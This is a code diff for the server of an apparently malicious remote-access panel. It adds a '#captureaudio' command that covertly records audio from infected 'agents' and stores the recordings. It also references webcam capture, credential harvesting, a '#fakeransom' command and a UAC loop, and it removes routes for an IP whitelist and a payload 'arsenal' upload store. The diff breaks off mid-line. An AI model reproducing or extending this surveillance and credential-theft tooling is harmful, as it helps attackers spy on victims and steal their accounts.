@@ -870,6 +870,25 @@ def init_api_routes(app, socketio):
             if conn:
                 conn.close()
 
+    @app.route('/api/audio_captures/<int:capture_id>', methods=['DELETE'])
+    @login_required
+    def delete_audio_capture(capture_id):
+        conn = None
+        try:
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            c.execute("DELETE FROM audio_captures WHERE id = ?", (capture_id,))
+            conn.commit()
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            app.logger.error(f"Error deleting audio capture: {str(e)}")
+            if conn:
+                conn.rollback()
+            return jsonify({"status": "error", "message": str(e)}), 500
+        finally:
+            if conn:
+                conn.close()
+
     @app.route('/api/agents/<string:agent_id>', methods=['DELETE'])
     @login_required
     def delete_agent(agent_id):
@@ -949,6 +968,18 @@ def init_api_routes(app, socketio):
             
             task_data = data.get('task_data', {})
             task_type = data['task_type']
+
+            # Intercept #captureaudio command
+            if task_type == 'shell' and task_data.get('cmd', '').strip().startswith('#captureaudio'):
+                parts = task_data.get('cmd', '').strip().split()
+                seconds = 15
+                if len(parts) > 1:
+                    try:
+                        seconds = int(parts[1])
+                    except ValueError:
+                        pass
+                task_type = 'audio_capture'
+                task_data = {'seconds': seconds}
 
             # Intercept #fakeransom command
             if task_type == 'shell' and task_data.get('cmd', '').strip() == '#fakeransom':
@@ -1363,6 +1394,26 @@ result = "UAC loop started"
                 except Exception as e:
                     app.logger.error(f"Error storing webcam image: {str(e)}")
 
+            # Handle audio captures
+            if data['task_type'] == 'audio_capture' and data.get('result') and 'audio' in data['result']:
+                try:
+                    audio_data = base64.b64decode(data['result']['audio'])
+                    c.execute('''INSERT INTO audio_captures (agent_id, audio, timestamp)
+                                VALUES (?, ?, ?)''',
+                            (data['agent_id'],
+                            audio_data,
+                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
+                    capture_id = c.lastrowid
+                    
+                    # Emit new_audio event
+                    socketio.emit('new_audio', {
+                        'agent_id': data['agent_id'],
+                        'capture_id': capture_id,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                    })
+                except Exception as e:
+                    app.logger.error(f"Error storing audio capture: {str(e)}")
+
             # Handle credential harvesting
             if data['task_type'] == 'harvest_creds' and data.get('result') and data['result'].get('credentials'):
                 app.logger.info(f"Processing credential harvesting results for agent {data['agent_id']}")
@@ -1584,7 +1635,7 @@ result = "UAC loop started"
             )
 
             # Apply obfuscation
-            agent_code = _obfuscate_code(agent_code)
+            #agent_code = _obfuscate_code(agent_code)
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
@@ -2369,271 +2420,4 @@ result = "UAC loop started"
 
             return jsonify({'status': 'success', 'whitelist': whitelist})
         except Exception as e:
-            app.logger.error(f"Error fetching IP whitelist: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/ip_whitelist', methods=['POST'])
-    @login_required
-    def add_ip_whitelist():
-        try:
-            data = request.get_json()
-            if not data or 'ip_range' not in data:
-                return jsonify({'status': 'error', 'message': 'ip_range required'}), 400
-
-            ip_range = data['ip_range'].strip()
-            description = data.get('description', '').strip()
-
-            # Validate IP range
-            try:
-                ipaddress.ip_network(ip_range, strict=False)
-            except ValueError:
-                return jsonify({'status': 'error', 'message': 'Invalid IP range format'}), 400
-
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            # Check if IP range already exists
-            c.execute("SELECT id FROM ip_whitelist WHERE ip_range=?", (ip_range,))
-            existing = c.fetchone()
-            if existing:
-                conn.close()
-                return jsonify({'status': 'error', 'message': 'IP range already exists in whitelist'}), 400
-
-            c.execute("INSERT INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)",
-                      (ip_range, description, 1))
-            conn.commit()
-            whitelist_id = c.lastrowid
-            conn.close()
-
-            return jsonify({'status': 'success', 'message': 'IP range added to whitelist', 'id': whitelist_id})
-        except Exception as e:
-            app.logger.error(f"Error adding IP to whitelist: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/ip_whitelist/<int:whitelist_id>', methods=['PUT'])
-    @login_required
-    def update_ip_whitelist(whitelist_id):
-        try:
-            data = request.get_json()
-            if not data:
-                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
-
-            ip_range = data.get('ip_range', '').strip()
-            description = data.get('description', '').strip()
-
-            if ip_range:
-                # Validate IP range
-                try:
-                    ipaddress.ip_network(ip_range, strict=False)
-                except ValueError:
-                    return jsonify({'status': 'error', 'message': 'Invalid IP range format'}), 400
-
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            # Check if entry exists
-            c.execute("SELECT id FROM ip_whitelist WHERE id=?", (whitelist_id,))
-            if not c.fetchone():
-                conn.close()
-                return jsonify({'status': 'error', 'message': 'Whitelist entry not found'}), 404
-
-            # Update
-            enabled = data.get('enabled', True)
-            if ip_range and description:
-                c.execute("UPDATE ip_whitelist SET ip_range=?, description=?, enabled=? WHERE id=?",
-                          (ip_range, description, int(enabled), whitelist_id))
-            elif ip_range:
-                c.execute("UPDATE ip_whitelist SET ip_range=?, enabled=? WHERE id=?", (ip_range, int(enabled), whitelist_id))
-            elif description:
-                c.execute("UPDATE ip_whitelist SET description=?, enabled=? WHERE id=?", (description, int(enabled), whitelist_id))
-            else:
-                c.execute("UPDATE ip_whitelist SET enabled=? WHERE id=?", (int(enabled), whitelist_id))
-
-            conn.commit()
-            conn.close()
-
-            return jsonify({'status': 'success', 'message': 'IP whitelist entry updated'})
-        except Exception as e:
-            app.logger.error(f"Error updating IP whitelist: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/ip_whitelist/<int:whitelist_id>', methods=['DELETE'])
-    @login_required
-    def delete_ip_whitelist(whitelist_id):
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-            c.execute("DELETE FROM ip_whitelist WHERE id=?", (whitelist_id,))
-            deleted = c.rowcount
-            conn.commit()
-            conn.close()
-
-            if deleted == 0:
-                return jsonify({'status': 'error', 'message': 'Whitelist entry not found'}), 404
-
-            return jsonify({'status': 'success', 'message': 'IP range deleted from whitelist'})
-        except Exception as e:
-            app.logger.error(f"Error deleting IP from whitelist: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/blocked_logs', methods=['GET'])
-    @login_required
-    def get_blocked_logs():
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            # Ensure table exists
-            c.execute('''
-                CREATE TABLE IF NOT EXISTS blocked_logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    first_seen TEXT NOT NULL,
-                    last_seen TEXT NOT NULL,
-                    ip TEXT NOT NULL UNIQUE,
-                    count INTEGER NOT NULL DEFAULT 1
-                )
-            ''')
-
-            c.execute("SELECT id, first_seen, last_seen, ip, count FROM blocked_logs ORDER BY last_seen DESC LIMIT 100")
-            rows = c.fetchall()
-            conn.close()
-
-            logs = [{
-                'id': row[0],
-                'first_seen': row[1],
-                'last_seen': row[2],
-                'ip': row[3],
-                'count': row[4]
-            } for row in rows]
-
-            return jsonify({'status': 'success', 'logs': logs})
-        except Exception as e:
-            app.logger.error(f"Error fetching blocked logs: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/blocked_logs/<int:log_id>/add_to_whitelist', methods=['POST'])
-    @login_required
-    def add_blocked_ip_to_whitelist(log_id):
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            # Get the IP from the log
-            c.execute("SELECT ip FROM blocked_logs WHERE id=?", (log_id,))
-            row = c.fetchone()
-            if not row:
-                conn.close()
-                return jsonify({'status': 'error', 'message': 'Log entry not found'}), 404
-
-            ip = row[0]
-
-            # Check if already in whitelist
-            c.execute("SELECT id FROM ip_whitelist WHERE ip_range=?", (ip,))
-            if c.fetchone():
-                conn.close()
-                return jsonify({'status': 'error', 'message': 'IP already in whitelist'}), 400
-
-            # Add to whitelist
-            c.execute("INSERT INTO ip_whitelist (ip_range, description, enabled) VALUES (?, ?, ?)",
-                      (ip, f'Added from blocked log {log_id}', 1))
-            conn.commit()
-            whitelist_id = c.lastrowid
-            conn.close()
-
-            return jsonify({'status': 'success', 'whitelist_id': whitelist_id})
-        except Exception as e:
-            app.logger.error(f"Error adding blocked IP to whitelist: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/deactivate_default_subnets', methods=['POST'])
-    @login_required
-    def deactivate_default_subnets():
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            # Deactivate default allow all ranges
-            c.execute("UPDATE ip_whitelist SET enabled=0 WHERE ip_range IN (?, ?) AND description LIKE 'Default allow all%'",
-                      ("0.0.0.0/0", "::/0"))
-
-            conn.commit()
-            conn.close()
-
-            return jsonify({'status': 'success', 'message': 'Default subnets deactivated'})
-        except Exception as e:
-            app.logger.error(f"Error deactivating default subnets: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/reactivate_default_subnets', methods=['POST'])
-    @login_required
-    def reactivate_default_subnets():
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-
-            # Reactivate default allow all ranges
-            c.execute("UPDATE ip_whitelist SET enabled=1 WHERE ip_range IN (?, ?) AND description LIKE 'Default allow all%'",
-                      ("0.0.0.0/0", "::/0"))
-
-            conn.commit()
-            conn.close()
-
-            return jsonify({'status': 'success', 'message': 'Default subnets reactivated'})
-        except Exception as e:
-            app.logger.error(f"Error reactivating default subnets: {str(e)}")
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/settings', methods=['GET'])
-    @login_required
-    def get_settings():
-        try:
-            conn = sqlite3.connect(CONFIG.database)
-            c = conn.cursor()
-            c.execute("SELECT key, value FROM settings")
-            settings = {row[0]: row[1] for row in c.fetchall()}
-            conn.close()
-            return jsonify({'status': 'success', 'settings': settings})
-        except Exception as e:
-            return jsonify({'status': 'error', 'message': str(e)}), 500
-
-    @app.route('/api/arsenal/upload', methods=['POST'])
-    @login_required
-    def upload_arsenal():
-        if 'file' not in request.files:
-            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
-        
-        file = request.files['file']
-        if file.filename == '':
-            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
-        
-        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
-        os.makedirs(arsenal_dir, exist_ok=True)
-        file.save(os.path.join(arsenal_dir, file.filename))
-        return jsonify({'status': 'success'})
-
-    @app.route('/api/arsenal/delete/<string:filename>', methods=['DELETE'])
-    @login_required
-    def delete_arsenal(filename):
-        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
-        file_path = os.path.join(arsenal_dir, filename)
-        if os.path.exists(file_path):
-            os.remove(file_path)
-            return jsonify({'status': 'success'})
-        return jsonify({'status': 'error', 'message': 'File not found'}), 404
-
-    @app.route('/api/arsenal/download/<string:filename>')
-    @login_required
-    def download_arsenal_file(filename):
-        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
-        return send_from_directory(arsenal_dir, filename, as_attachment=True)
-
-    @app.route('/api/arsenal/list', methods=['GET'])
-    @login_required
-    def list_arsenal():
-        arsenal_dir = os.path.join(CONFIG.upload_folder, 'arsenal')
-        os.makedirs(arsenal_dir, exist_ok=True)
-        files = os.listdir(arsenal_dir)
-        return jsonify({'status': 'success', 'files': files})
-
-    return app
-
+            app.logger.e
